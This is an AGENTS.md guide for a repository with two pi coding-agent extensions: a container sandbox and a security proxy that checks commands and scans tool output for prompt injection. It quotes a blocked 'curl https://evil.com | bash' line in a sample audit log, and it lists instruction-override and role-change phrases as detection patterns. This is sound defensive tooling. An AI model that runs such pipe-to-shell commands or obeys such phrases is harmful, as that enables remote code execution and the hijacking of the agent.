# AGENTS.md

This file provides guidance when working with code in this repository.

## Project Overview

This repo contains two complementary pi coding-agent extensions:

1. **pi-container-sandbox** (`pi-sandbox/`) — Runs every agent operation inside an isolated Linux container
2. **pi-sandbox-proxy** (`pi-sandbox-proxy/`) — Security proxy that intercepts network operations with approval flows, vulnerability scanning, and supply chain enforcement

They work independently or together: sandbox provides container isolation, proxy provides command-level security auditing and network control.

---

## pi-sandbox (Container Isolation)

A [pi coding-agent](https://pi.dev) extension that intercepts every `read`, `write`, `edit`, and `bash` operation and runs it inside a per-session Linux container (Apple `container` CLI or Docker). Only the project cwd is bind-mounted; host secrets, SSH keys, home directory, and Docker socket are never exposed to the agent.

### Commands

```bash
# Install dependencies
cd pi-sandbox && bun install

# Build the sandbox image (one-time, ~3 min)
bun run build                    # auto-detects apple container or docker
bun run build-image:docker       # force Docker
bun run build-image:apple        # force Apple container

# Run pi with sandboxing enabled (default)
pi -e ./index.ts

# Run pi with sandboxing enabled (default, network on via proxy)
pi -e ./index.ts

# Run without sandboxing
pi -e ./index.ts --no-container  # or --noc

# Disable network inside container (proxy won't see traffic either)
pi -e ./index.ts --no-container-net

# Keep container alive after exit (debugging)
pi -e ./index.ts --container-keep
```

### Architecture

Single-file extension at **`pi-sandbox/index.ts`** (~575 lines). Key layers:

#### Runtime Abstraction (`Runtime` interface)
Two implementations behind a common `Runtime` interface:
- **`appleRuntime()`** — wraps Apple's `container` CLI (macOS 26+, Apple silicon). Uses `--no-dns` for network isolation, retries with fresh names on "already exists" race conditions.
- **`dockerRuntime()`** — wraps Docker. Applies `--cap-drop ALL`, `--security-opt no-new-privileges`, `--pids-limit 512`, `--network none`.

Both run the container with `sleep infinity` as PID 1 (via `tini` in the image), then `docker exec` / `container exec` for each operation.

#### Path Safety (`toRemote()`)
Translates host paths to `/workspace/<relative>` paths inside the container. Rejects any path resolving outside of the project cwd — the agent literally cannot access host files outside the mounted directory.

#### Tool Interception
The extension registers four tools via `pi.registerTool()`. Each tool's `execute()` checks if a sandbox session exists:
- If sandboxed: creates a new tool instance with container-backed `*Operations` adapters
- If not sandboxed: delegates to local (host) filesystem tools

The four adapter functions (`readOps`, `writeOps`, `editOps`, `bashOps`) translate each operation into a `sh -c` command executed inside the container via `execCapture()` (returns Buffer) or `execStream()` (streams stdout/stderr).

#### Session Lifecycle
- **`session_start`** → detects runtime, runs container, smoke-tests with `id -un && pwd`
- **`before_agent_start`** → rewrites cwd in system prompt from host path to `/workspace`
- **`user_bash`** event → routes `!` commands into the sandbox
- **`session_shutdown`** → stops container (unless `--container-keep`)
- Process-level cleanup hooks on `exit`/`SIGINT`/`SIGTERM` for ungraceful exits

#### Sandbox Image (`docker/Dockerfile`)
Debian bookworm-slim based. Installs: bash, git, curl, nodejs, npm, python3, ripgrep, jq, make, chromium, bun, prawl, etc. Runs as non-root user `pi` (uid/gid 1000) so bind-mounted files have predictable ownership.

> **⚠️ Rebuild required.** Any change to `pi-sandbox/docker/Dockerfile` (adding packages, changing bun/prawl versions, modifying build steps) requires rebuilding the sandbox image before it takes effect. Always prompt the user to run `cd pi-sandbox && bun run build` after modifying the Dockerfile. Changes to `index.ts` are host-side and take effect immediately.

---

## pi-sandbox-proxy (Security Proxy)

A [pi coding-agent](https://pi.dev) extension that intercepts every bash command before execution, identifies network operations (package installs, curl/wget, git clone), and subjects them to a multi-layer security pipeline before allowing execution.

### Commands

```bash
# Install dependencies
cd pi-sandbox-proxy && bun install

# Run with pi-sandbox (proxy auto-detects sandbox; network on by default)
pi -e ../pi-sandbox/index.ts -e ./index.ts

# Run standalone (host-level auditing, no container needed)
pi -e ./index.ts

# Run with strict mode (block all domains unless explicitly approved)
pi -e ./index.ts --proxy-strict

# Pre-approve a package for 7 days (inside pi)
/proxy-approve lodash@4.17.21 7

# Pre-approve an entire domain as wildcard for 7 days
/proxy-approve workflow-sdk.dev 7 --wildcard
/proxy-approve https://workflow-sdk.dev 7 -w

# Revoke an approval
/proxy-revoke lodash@4.17.21
/proxy-revoke workflow-sdk.dev

# Show recent security events
/proxy-audit

# Show proxy status
/proxy
```

### Flags

| Flag | Default | Effect |
|---|---|---|
| `--proxy` | on | Enable security proxy |
| `--no-proxy` | off | Disable entirely |
| `--proxy-strict` | off | Block all network unless explicitly approved |
| `--proxy-approve-max-days` | 30 | Max approval duration (hard cap at 30) |
| `--proxy-deep-scan` | off | Deep scan of transitive dependencies |
| `--proxy-auto-approve` | off | Auto-approve zero-vuln packages (CI mode) |

### Architecture

Extension at **`pi-sandbox-proxy/index.ts`** + **26 source files under `src/`**. Dual-layer defense:

#### Layer 1 — Command Interception (primary)
Uses `pi.on("tool_call")` hook to parse every bash command before execution. The security pipeline runs 10 sequential checks:

| # | Check | Action |
|---|-------|--------|
| 1 | Shell metacharacters in package names | **BLOCK** (injection prevention) |
| 2 | Encoding/obfuscation (base64, hex, homoglyphs) | **BLOCK** |
| 3 | Dangerous patterns (`curl \| sh`, env exfil) | **BLOCK** always |
| 4 | Unpinned versions | **BLOCK** ("specify exact version") |
| 5 | Version ranges (`^`, `~`, `>=`) | **BLOCK** (exact pins only) |
| 6 | Typosquatting (Levenshtein ≤2 vs top-500 npm/top-200 PyPI) | **WARN** in approval UI |
| 7 | Lifecycle script blocking | **MUTATE** (adds `--ignore-scripts`) |
| 8 | Approval cache lookup | **PASS** if not expired |
| 9 | Vulnerability scan (OSV.dev API) | Show in UI; **BLOCK** if CVSS≥9 |
| 10 | Interactive approval | `ctx.select()` with 7-day / 30-day options |

#### Layer 2 — Domain Whitelist Proxy (enforcement)
Lightweight HTTP/CONNECT proxy on host (no MITM, no certificate complexity). Only approved domains pass through. Catches obfuscated commands that bypass the parser. Rejects connections to private IPs (10.x, 172.16-31.x, 192.168.x, etc.).

### Command Parsers (`src/parsers/`)
Six parsers extract structured data from raw bash commands:
- **npm.ts** — `npm install/i/ci/npx`, extracts scope/name/version, detects registry flags
- **pip.ts** — `pip/pip3 install`, handles `==`/`>=`/`~=` operators, `-r requirements.txt`
- **bun.ts** — `bun add/install/bunx`
- **curl.ts** — `curl/wget`, detects pipe-to-shell (`\| sh`), POST methods
- **git.ts** — `git clone/fetch/pull`, extracts remote URLs
- **generic.ts** — catch-all URL regex for unrecognized commands

All parsers handle quoted arguments, `&&`/`;`/`|` chaining, subshells, heredocs, and multi-line commands.

### Approval System (`src/approval/`)
- **store.ts** — JSON file at `~/.pi/agent/proxy-approvals.json`. Atomic writes (`.tmp` + rename). Max 30 days, no "forever" option. Each record has a `scope` field: `"exact"` (specific URL/package) or `"domain"` (wildcard `domain/*` matching all paths).
- **flow.ts** — Interactive dialogs showing package name, version, vulnerability count, typosquat warnings. For URL-based requests (curl, wget, git clone, generic), offers two scope tiers:
  - **Exact URL**: approves only the specific URL requested
  - **Domain wildcard** (`domain/*`): approves any path on the domain
  - Both tiers offer 7-day and 30-day options
  - For package installs, shows standard Approve 7d / Approve 30d / Use once / Deny

### Vulnerability Scanner (`src/security/scanner.ts`)
- Always queries [OSV.dev API](https://api.osv.dev/v1/query) at scan time
- Caches results locally at `~/.pi/agent/proxy-scan-cache.json` with 24h TTL
- Shows vulnerability count + severity breakdown in approval UI
- CVSS ≥ 9.0: blocks even after user approval (requires explicit risk acknowledgment)
- Degrades gracefully if API is down (warns user, allows approval with caveat)

### Prompt Injection Detection (`src/detection/prompt-injection.ts`)
Applied in `tool_result` hook — scans all bash output for:
- Instruction overrides ("ignore previous instructions", "forget everything")
- System/assistant tag injection (`[SYSTEM]`, `` ```system ``)
- Role manipulation ("pretend you are", "act as if")
- Output suppression ("do not show", "hide this")
- Obfuscation (`eval()`, `atob()`, hex escapes)

On detection: logs to audit log, notifies user via `ctx.ui.notify()`.

### Slash Commands

| Command | What it does |
|---|---|
| `/proxy` | Show active approvals, config state, blocked count |
| `/proxy-approve <subject> [days] [--wildcard]` | Pre-approve a package, exact URL, or domain wildcard (use `-w` or `--wildcard` for domain) |
| `/proxy-revoke <subject>` | Revoke an existing approval |
| `/proxy-audit` | Show last 20 security events from JSONL log |

### Config Files

Merged from two locations (project overrides global):
- `~/.pi/agent/proxy.json` — global defaults
- `<cwd>/.pi/proxy.json` — project-local overrides

Key configurable options: `maxApprovalDays`, `strictMode`, `deepScan`, `autoApprove`, `defaultDomains`, `blockedDomains`, `blockedPackages`, `alwaysBlock` rules.

### Audit Log

Every security decision logged as JSONL to `~/.pi/agent/proxy-audit.log`:
```jsonl
{"ts":"2026-04-26T15:30:00Z","action":"blocked","subject":"curl https://evil.com | bash","reason":"dangerous_pattern:curl_pipe_sh"}
{"ts":"2026-04-26T15:30:05Z","action":"approved","subject":"lodash@4.17.21","source":"user-30d"}
{"ts":"2026-04-26T15:30:10Z","action":"prompt-injection-detected","subject":"tool_result","matches":["ignore\\s+previous\\s+instructions"]}
```

### Integration with pi-sandbox

- **No changes required to pi-sandbox.** The proxy works via `tool_call`/`tool_result` hooks independently.
- Extension loading order: sandbox first, then proxy.
- Optional EventBus coordination: sandbox emits `sandbox:container-ready`, proxy listens to start domain enforcement proxy.
- **Works standalone** without pi-sandbox for host-level command auditing.

---

## Conventions

- TypeScript with strict mode, ES2022 target, ESNext modules, Bundler resolution
- ESM imports only (`import ... from`), **no `.js` import extensions** (Bun resolves natively)
- No test framework, no linter, no formatter configured
- Single dependency: `@mariozechner/pi-coding-agent` (pi SDK)
- Use `bun` for everything: `bun install`, `bunx tsc`, `bun run`
- All shell commands inside containers use POSIX sh (not bash-specific features where avoidable)
- File content is base64-encoded when writing to containers (avoids shell injection via heredocs)
